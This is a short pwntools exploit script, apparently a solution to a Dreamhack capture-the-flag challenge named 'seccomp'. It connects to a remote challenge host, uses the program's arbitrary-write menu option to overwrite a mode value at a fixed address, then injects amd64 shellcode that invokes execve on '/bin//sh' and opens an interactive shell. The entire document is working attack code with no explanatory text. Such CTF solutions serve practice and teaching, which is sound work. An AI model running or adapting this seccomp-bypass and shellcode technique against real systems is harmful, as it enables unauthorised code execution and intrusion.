#!/usr/bin/python3

from pwn import *
 
context.binary = exe = ELF('./seccomp',checksec=False)

# p = process(exe.path)
p = remote("host3.dreamhack.games", 23236)
 
mode = 0x602090
shellcode = asm('''
                    mov rax, 0x3b
                    mov rdi, 29400045130965551
                    push rdi

                    mov rdi, rsp
                    xor rsi, rsi
                    xor rdx, rdx

                    syscall
                ''', arch = 'amd64')
 
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'addr: ', str(mode))
p.sendlineafter(b'value: ',b'2')

p.sendlineafter(b'> ',b'1')
p.sendafter(b'shellcode: ', shellcode)
 
p.sendlineafter(b'> ',b'2')
 
p.interactive()